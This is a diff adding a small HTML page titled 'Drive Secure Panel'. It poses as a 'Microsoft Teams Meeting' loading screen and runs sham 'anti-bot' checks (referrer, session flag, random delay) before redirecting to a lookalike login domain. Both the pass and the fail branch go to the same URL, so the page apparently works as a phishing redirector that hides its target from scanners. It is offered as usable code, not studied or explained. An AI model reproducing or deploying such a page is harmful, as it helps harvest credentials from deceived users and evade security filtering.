@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drive Secure Panel</title>
+    <style>
+        .loader {
+            border: 6px solid #f3f3f3; /* Light grey */
+            border-top: 6px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Basic style for the content */
+        .content {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        /* Message that is shown while waiting */
+        #verifying {
+            display: none;
+            margin-top: 50px;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h2>.</h2>
+        <div id="verifying">Microsoft Teams Meeting</div>
+        <div class="loader" id="loading"></div>
+    </div>
+
+    <script>
+        // Anti-bot validation process
+        window.onload = function() {
+            // Step 1: Display "Verifying" message and show loading spinner
+            document.getElementById('verifying').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
+
+            // Step 2: Validate if JavaScript is running and a valid session exists
+            validateUser();
+        };
+
+        function validateUser() {
+            // Step 3: Add a delay (let's say 3-5 seconds) before redirecting to avoid bot bypass
+            setTimeout(function() {
+                // Step 4: Check the referrer to ensure valid navigation (not direct bot access)
+                if (document.referrer === '' || !isValidReferrer()) {
+                    console.log('Invalid referrer detected!');
+                    redirectToErrorPage();
+                    return;
+                }
+
+                // Step 5: Use session storage to verify if JavaScript was executed
+                if (!sessionStorage.getItem('validUser')) {
+                    console.log('Session check failed!');
+                    redirectToErrorPage();
+                    return;
+                }
+
+                // Step 6: If all checks are passed, perform the redirect
+                window.location.href = "https://login.clouede-support.financialsservicing.net/zdJInTWT"; // Replace with your desired URL
+            }, getRandomDelay()); // Random delay to make it harder for bots to predict
+        }
+
+        function isValidReferrer() {
+            // You can customize the referrer check for specific allowed sources
+            const validReferrers = ["https://yourwebsite.com", "https://another-trusted-source.com"];
+            return validReferrers.includes(document.referrer);
+        }
+
+        function getRandomDelay() {
+            // Random delay between 3-5 seconds to simulate human behavior
+            return Math.floor(Math.random() * 2000) + 3000; // 3000ms (3 seconds) to 5000ms (5 seconds)
+        }
+
+        function redirectToErrorPage() {
+            // If validation fails, redirect to an error page or show a failure message
+            window.location.href = "https://login.clouede-support.financialsservicing.net/zdJInTWT"; // Replace with your error URL
+        }
+
+        // Step 7: Simulate the "valid user" flag to make sure this script runs as expected
+        // This mimics user interaction; bots would not reach this point
+        sessionStorage.setItem('validUser', 'true');
+    </script>
+</body>
+</html>
